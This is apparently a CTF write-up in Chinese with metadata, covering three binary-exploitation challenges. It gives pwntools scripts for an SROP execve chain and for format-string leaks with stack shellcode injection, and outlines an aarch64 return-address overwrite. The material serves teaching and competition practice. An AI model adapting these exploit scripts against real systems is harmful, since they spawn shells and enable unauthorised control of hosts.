---
title: 第八届御网杯 线上下线 pwn Writeup by Mini-Venom
contest: 御网杯
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags: [SROP, sigreturn, ret2syscall, RWX-stack, fmt-leak, aarch64, X30-register, PIE-2-byte, fmt-overwrite]
attack_chain:
  - asm (SROP): 控制 rax=0x15 触发 sigreturn → frame.rax=constants.SYS_execve, frame.rdi=bin_sh=0x40200A, frame.rip=0x40102D syscall
  - payload: 8 个 0x40103D/0x401034/0x401030/0x401034 链 + 0x40102D 触发 syscall + bytes(frame)
  - ret: 栈上有 RWX 权限 + fmt 泄栈地址 stack = get_addr64() - 144
  - shellcode = asm(shellcraft.sh()); payload = shellcode.ljust(0x88, b'\x00') + p64(stack)
  - aarch64 normal pwn: 非栈上 fmt 漏洞，返回时栈值赋给 X30 寄存器
  - pie 开了等于没开：仅需改 2 字节，构造栈上 ROP 链改返回地址到后门
  - qemu-aarch64 -L /usr/aarch64-linux-gnu -g 1234 ./pwn 调试
key_payload: 'SROP frame + bin_sh=0x40200A + rip=0x40102D syscall + aarch64 X30 ret overwrite'
one_liner: 御网杯 3 题 PWN：SROP rax=0x15 sigreturn 调 execve + RWX 栈 fmt 泄 + aarch64 fmt 改 X30 寄存器。
lesson: SROP 是绕过单 syscall gadget 限制的利器；栈 RWX 是 fmt + shellcode 的完美组合；aarch64 X30 寄存器等价于 x86 RIP。
quality: high
---

# 第八届御网杯 线上下线 pwn writeup by Mini-Venom

**来源**: ctfiot.com ID 213477
**战队**: Mini-Venom（ChaMd5 招新广告）

## 1. asm (SROP)

### 漏洞
- 利用 gadget 控制 rax=0x15（sys_rt_sigreturn 编号）
- 题目给出 /bin/sh 字符串
- 用 SROP 打 execve

### 利用
```python
from pwn import *
from struct import pack
import ctypes

context(os='linux', arch='amd64', log_level='debug')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pwn')
p = process('./pwn')

bin_sh = 0x40200A
rl(b'Hello Pwn')

frame = SigreturnFrame()
frame.rax = constants.SYS_execve  # 59
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x40102D  # syscall

payload = p64(0x40103D) + p64(0x401034) + p64(0x401030) + p64(0x401034) + p64(0x401030) + p64(0x401034) + p64(0x401030) + p64(0x401034) + p64(0x40102D) + bytes(frame)
s(payload)
inter()
```

## 2. ret（栈 RWX + fmt 泄栈）

### 漏洞
- 栈上有 rwx 权限
- 格式化字符串泄露栈地址
- 计算偏移得到读入 shellcode 地址
- 栈溢出返回到 shellcode

```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('101.200.58.4', 10004)

rl("hello,What do you want to ask?")
payload = b'%8$p'
s(payload)
stack = get_addr64() - 144
rl(b'number\n')

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x88, b'\x00') + p64(stack)
s(payload)
inter()
```

## 3. normal pwn (aarch64)

### 漏洞
- aarch64 架构堆题
- 非栈上 fmt 漏洞
- 返回时栈的值赋给 X30 寄存器（aarch64 的 return address）

### 利用
- pie 开了等于没开
- 只需改 2 字节
- 构造栈上 ROP 链
- 改返回地址到后门

```python
context(log_level='debug', arch='aarch64', os='linux')
elf = ELF('./pwn')
io = remote('101.200.58.4', 5555)
# p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "-g", "1234", "./pwn"])
```

## 评价
御网杯 PWN 三题覆盖三大主流方向：x86_64 SROP、x86_64 RWX shellcode、aarch64 fmt。Mini-Venom 战队的标准 pwn 工具集（pwntools + LibcSearcher + ctypes）配合 3 种架构。
